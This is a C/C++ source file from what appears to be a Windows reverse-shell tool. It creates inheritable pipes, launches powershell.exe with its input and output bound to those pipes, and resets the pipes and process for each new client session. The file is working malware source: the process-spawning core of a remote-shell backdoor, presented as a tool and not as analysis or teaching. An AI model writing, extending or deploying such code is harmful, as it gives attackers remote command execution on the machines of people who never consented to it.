#include "reverse-shell.h"

extern reverseShell_t shell;

static void formatProcessAttributes(void) {
	shell.startupInfo.cb = sizeof(STARTUPINFO);
	shell.startupInfo.dwFlags = STARTF_USESTDHANDLES;
	shell.startupInfo.hStdInput = shell.childRead;
	shell.startupInfo.hStdOutput = shell.childWrite;
	shell.startupInfo.hStdError = shell.childWrite;
}

static currentState_e createProcess(void) {

	formatProcessAttributes();

	wchar_t cmd[] = L"powershell.exe";

	if (!CreateProcessW(
		NULL,
		cmd,
		NULL, NULL,
		TRUE, 0,
		NULL, NULL,
		&shell.startupInfo,
		&shell.processInfo
	)) {
		return (FATAL_ERROR);
	} else {
		Sleep(1000); // Wait for the child to start before close handles
		CloseHandle(shell.childRead);
		CloseHandle(shell.childWrite);
	}
	return (CONTINUE_SESSION);
}

static void formatSecurityAttributes(void) {
	shell.secAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	shell.secAttributes.lpSecurityDescriptor = NULL;
	shell.secAttributes.bInheritHandle = TRUE;
}

static currentState_e createPipes(void) {

	formatSecurityAttributes();

	if (!CreatePipe(&shell.parentRead, &shell.childWrite,
					&shell.secAttributes, 0)) {
			return (FATAL_ERROR);
	}
	if (!CreatePipe(&shell.childRead, &shell.parentWrite,
					&shell.secAttributes, 0)) {
			return (FATAL_ERROR);
	}

	SetHandleInformation(shell.parentRead, HANDLE_FLAG_INHERIT, 0);
	SetHandleInformation(shell.parentWrite, HANDLE_FLAG_INHERIT, 0);

	return (CONTINUE_SESSION);
}

static currentState_e updatePipes(void) {
	if (shell.parentRead) CloseHandle(shell.parentRead);
	if (shell.parentWrite) CloseHandle(shell.parentWrite);
	if (shell.childRead) CloseHandle(shell.childRead);
	if (shell.childWrite) CloseHandle(shell.childWrite);

	return (createPipes());
}

static currentState_e updateProcess(void) {
	if (shell.processInfo.hProcess) {
		TerminateProcess(shell.processInfo.hProcess, 0);
		CloseHandle(shell.processInfo.hProcess);
	}
	if (shell.processInfo.hThread)
		CloseHandle(shell.processInfo.hThread);
	
	shell.processInfo = {};
	return (createProcess());
}

currentState_e newSession(void) {
	closesocket(shell.clientSocket);

	if (updatePipes() == FATAL_ERROR)
		return (FATAL_ERROR);
	if (updateProcess() == FATAL_ERROR)
		return (FATAL_ERROR);

	return (CONTINUE_SESSION);
}